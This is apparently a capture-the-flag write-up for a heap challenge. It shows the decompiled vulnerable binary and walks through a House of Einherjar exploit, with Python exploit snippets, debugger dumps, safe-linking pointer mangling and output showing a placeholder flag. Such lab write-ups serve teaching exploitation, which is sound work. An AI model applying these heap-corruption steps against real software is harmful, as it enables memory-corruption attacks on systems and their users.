# challenge 8.0 

```c

undefined8 main(undefined8 param_1,undefined8 *param_2)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  void *pvVar4;
  ulong uVar5;
  long in_FS_OFFSET;
  int local_b8;
  void *local_a8;
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  puts(
      "This challenge allows you to perform various heap operations, some of which may involve the f lag.\n"
      );
  printf("This challenge can manage up to %d unique allocations.\n\n",0x10);
LAB_001013f3:
  do {
    puts("");
    printf("[*] Function (malloc/read_copy/read_flag/free/puts/quit): ");
    __isoc99_scanf("%127s",local_98);
    puts("");
    iVar1 = strcmp(local_98,"quit");
    if (iVar1 == 0) {
LAB_00101bbd:
      puts("### Goodbye!");
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    iVar1 = strcmp(local_98,"malloc");
    if (iVar1 != 0) {
      iVar1 = strcmp(local_98,"free");
      if (iVar1 == 0) {
        printf("Index: ");
        __isoc99_scanf("%127s",local_98);
        puts("");
        uVar2 = atoi(local_98);
        if (0xf < uVar2) {
                    /* WARNING: Subroutine does not return */
          __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x61,"main");
        }
        printf("[*] free(allocations[%d])\n",(ulong)uVar2);
        free(*(void **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
        *(undefined8 *)(alloc_struct + ((ulong)uVar2 + 0x20) * 8) = 0;
        *(undefined4 *)(alloc_struct + ((ulong)uVar2 + 0x60) * 4) = 0;
        printf("[*] allocations[%d] = %p\n",(ulong)uVar2,
               *(undefined8 *)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
      }
      else {
        iVar1 = strcmp(local_98,"puts");
        if (iVar1 == 0) {
          printf("Index: ");
          __isoc99_scanf("%127s",local_98);
          puts("");
          uVar2 = atoi(local_98);
          if (0xf < uVar2) {
                    /* WARNING: Subroutine does not return */
            __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x71,"main");
          }
          iVar1 = malloc_usable_size(*(undefined8 *)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
          if (iVar1 != 0) {
            printf("[*] puts(allocations[%d])\n",(ulong)uVar2);
            printf("Data: ");
            puts(*(char **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
          }
        }
        else {
          iVar1 = strcmp(local_98,"read_copy");
          if (iVar1 == 0) {
            printf("Index: ");
            __isoc99_scanf("%127s",local_98);
            puts("");
            uVar2 = atoi(local_98);
            if (0xf < uVar2) {
                    /* WARNING: Subroutine does not return */
              __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x82,"main");
            }
            if (*(uint *)(alloc_struct + ((ulong)uVar2 + 0x60) * 4) == 0) {
              puts("Cannot read to freed indexes!");
            }
            else {
              printf("[*] read(0, stack_buffer)\n",(ulong)uVar2,
                     (ulong)*(uint *)(alloc_struct + ((ulong)uVar2 + 0x60) * 4));
              uVar5 = read(0,strcpy_scratch,(long)*(int *)(alloc_struct + ((ulong)uVar2 + 0x60) * 4)
                          );
              memcpy(*(void **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8),strcpy_scratch,
                     (long)(int)uVar5);
              *(undefined *)((long)(int)uVar5 + *(long *)(alloc_struct + ((ulong)uVar2 + 0x20) * 8))
                   = 0;
              printf("[*] memcpy(allocations[%d], stack_buffer, %d)\n",(ulong)uVar2,
                     uVar5 & 0xffffffff);
              printf("[*] allocations[%d] = 0x00\n",(ulong)uVar2);
              puts("");
            }
          }
          else {
            iVar1 = strcmp(local_98,"read_flag");
            if (iVar1 != 0) {
              puts("Unrecognized choice!");
              goto LAB_00101bbd;
            }
            for (local_b8 = 0; local_b8 < 1; local_b8 = local_b8 + 1) {
              printf("[*] flag_buffer = malloc(%d)\n",0x4ee);
              local_a8 = malloc(0x4ee);
              printf("[*] flag_buffer = %p\n",local_a8);
            }
            iVar1 = open("/flag",0);
            read(iVar1,local_a8,0x80);
            puts("[*] read the flag!");
          }
        }
      }
      goto LAB_001013f3;
    }
    printf("Index: ");
    __isoc99_scanf("%127s",local_98);
    puts("");
    uVar2 = atoi(local_98);
    if (0xf < uVar2) {
                    /* WARNING: Subroutine does not return */
      __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x48,"main");
    }
    printf("Size: ");
    __isoc99_scanf("%127s",local_98);
    puts("");
    uVar3 = atoi(local_98);
    if (uVar3 < 0x1001) {
      printf("[*] allocations[%d] = malloc(%d)\n",(ulong)uVar2,(ulong)uVar3);
      pvVar4 = malloc((ulong)uVar3);
      *(void **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8) = pvVar4;
      *(uint *)(alloc_struct + ((ulong)uVar2 + 0x60) * 4) = uVar3;
      printf("[*] allocations[%d] = %p\n",(ulong)uVar2,
             *(undefined8 *)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));
    }
    else {
      printf("[!] Max allocation size allowed is 0x%x\n",0x1000);
    }
  } while( true );
}


```

## House of Einherjar

First create 3 chunks A, B and C with some certain sizes. Chunk B's size cannot be too big because we need chunk C's prev_size field to be able to "connect" with somewhere in chunk A. The "somewhere" in chunk A is the starting location of a flag chunk that is within chunk A. Yes, we are first creating a fake chunk inside a chunk again. 

The goal is to overlap chunk A with chunk B so that we can sort of overflow to chunk B from chunk A and if chunk B is freed into the tcache, we can poison the `next` pointer of chunk B to point to a arbitrary location we wish malloc to return.

## Primitive:
Here's what we need for House of Einhejar:
1. heap leak (to bypass the unlink check of unsortedbin)
2. off-by-one / off-by-null / heap buffer overflow

## What do we do:
1. Create 3 chunks, chunk A, B and C 
2. Their sizes need to be chosen carefully, chunk B's size cannot be larger than chunk A's size. Chunk A better have a little bit more size for the fake chunk. Chunk C's size has to be a multiple of 0x100. i.e. 0x100, 0x200, 0x300, etc. So that we can corrupt the flag bits that indicates whether the previos chunk is in use, without corrupt the size itself. For example, if the size is 0x81 (with 1 indicating that the previous chunk is in use). A null byte overwrites would make 0x81 to 0x00 directly, which corrupts its size completely and might cause problems. An example of working combination of sizes is: 0x40, 0x30, 0x100
3. Create a fake chunk within chunk A. Inside chunk A, we create a fake chunk like this:
```
pwndbg> tele 0x564de557b2b0 
00:0000│  0x564de557b2b0 ◂— 0
01:0008│  0x564de557b2b8 ◂— 0x41 /* 'A' */
02:0010│  0x564de557b2c0 ◂— 0
03:0018│  0x564de557b2c8 ◂— 0x60 /* '`' */
04:0020│  0x564de557b2d0 —▸ 0x564de557b2c0 ◂— 0
05:0028│  0x564de557b2d8 —▸ 0x564de557b2c0 ◂— 0
```
Where `0x564de557b2c0` is the starting address of the fake chunk. `0x564de557b2c8` is the size field of the fake chunk. `0x564de557b2d0` and `0x564de557b2d8` is the `fd` and `bk` pointers of the fake chunk. Since the first very chunk we planned to put into the unsortedbin is our fake chunk consolidated with chunk C. `fd` and `bk` pointers should point to itself to bypass the unlink checks:. This is why we need a heap leak here. 
4. Write the last 8 bytes of chunk B to be the 0x60, the fake size of the fake chunk. Also make sure that `prev_size` field minus the size (e.g. 0x60) is exactly where our fake chunk starts. At the same time make sure overwriting flag bits of the size field of chunk C from beign something like 0x101 to 0x100 with our 1 null byte overflow.
This is how `1-4` would look like in the python script:
```py
# house of einhejar
p.sendline("malloc 1 50") # chunk a 0x40 bytes
p.sendline("malloc 2 40") # chunk b 0x30 bytes
p.sendline("malloc 3 248") # chunk c 0x100 bytes

# creating a fake chunk and overflowing the size fields of C
p.sendline("read_copy 1")
p.sendline(p64(0) + p64(0x60) + p64(chunk_addr) + p64(chunk_addr))
p.sendline("read_copy 2")
p.sendline(b'B' * 0x20 + p64(0x60))
```
where `read_copy` is the function that read user input into the heap chunk but appends a null byte at the end and causes off-by-null. 
5. Free chunk C which is now mistakenly thinking that the fake chunk inside chunk A is currently the previous chunk and is freed. So freeing chunk C would make chunk C consolidate with the fake chunk that is in chunk A. So with fake size being 0x60 and the real size of chunk C being 0x100. The size of the freed chunk would be 0x160. And the starting location of that freed chunk is where the fake chunk starts within chunk A.
6. Since we wish to have our consolidated fake chunk lands in unsortedbin. We need to fill the tcachebin with the size of chunk C. So that at the moment chunk C is freed. It goes to unsortedbin and thus it would consolidate with fake chunk which has the structure as an unsortedbin chunk and being `not_in_use` (corrupted flag bits)
The process in python looks like:
```py
# filling up tcache so that it goes into unsortedbin
for i in range(4, 11):
	p.sendline(f"malloc {i} 248")
for i in range(4, 11):
	p.sendline(f"free {i}")
# freeing chunk C and it starts to consolidate now!
p.sendline("free 3")
```
Results:
```
tcachebins
0x100 [  7]: 0x5606bbb45a30 —▸ 0x5606bbb45930 —▸ 0x5606bbb45830 —▸ 0x5606bbb45730 —▸ 0x5606bbb45630 —▸ 0x5606bbb45530 —▸ 0x5606bbb45430 ◂— 0                                                                                          
fastbins
empty
unsortedbin
all: 0x5606bbb452c0 —▸ 0x7fbebca19ce0 ◂— 0x5606bbb452c0
```
Now if we malloc a size of 0x160, we will get this chunk, which starts from the starting location of the fake chunk which is inside chunk A and having a size of 0x160! Which means it overlaps with chunk or even chunks after chunk B!  

Now if we free a padding chunk and chunk B into the tcachebins. We can overwrite the next pointer of chunk B to not point to the padding chunk but to an arbitrary location we desire!

Here's how the process looks like in python:
```py
# malloc(0x158) to get the chunk, we call this the chunk D
p.sendline("malloc 11 344") 
# chunk B is after chunk D (which was within chunk A)
# So we free it and then use the malloc'd chunk D to overwrite the next pointer, fd pointer of chunk B in the free list
p.sendline("malloc 12 40") # padding freed chunk 
p.sendline("free 12")
p.sendline("free 2") 


# get the flag chunk


# defeat safe linking

flag_chunk = heap_leak + 0xb60
chunk_addr = heap_leak + 0x300
mangled_ptr = ((chunk_addr >> 12) ^ (flag_chunk))
# Overwrite from chunk D
p.sendline("read_copy 11")
p.sendline(b'A' * 0x30 + p64(mangled_ptr)) 
```
Result:
```
tcachebins
0x30 [  2]: 0x559c0968c300 —▸ 0x559c0968cb60 ◂— 0x559c0968c

```
We have overwritten the next pointer to point to `0x559c0968cb60`, a unintialized chunk where the flag chunk would land later. 
After a simple `read_flag` function in the challenge. Which allocations a chunk for flag, would be using `0x559c0968cb60` as the data section of the chunk that the flag chunk is going to be using. And after a `puts`, we get the flag.
```
[*] Function (malloc/read_copy/read_flag/free/puts/quit): 
Index: 
Size: 
[*] allocations[14] = malloc(40)
[*] allocations[14] = 0x55657b870b60

[*] Function (malloc/read_copy/read_flag/free/puts/quit): 
[*] flag_buffer = malloc(1262)
[*] flag_buffer = 0x55657b870b60
[*] read the flag!

[*] Function (malloc/read_copy/read_flag/free/puts/quit): 
Index: 
[*] puts(allocations[14])
Data: flag{faker}

```





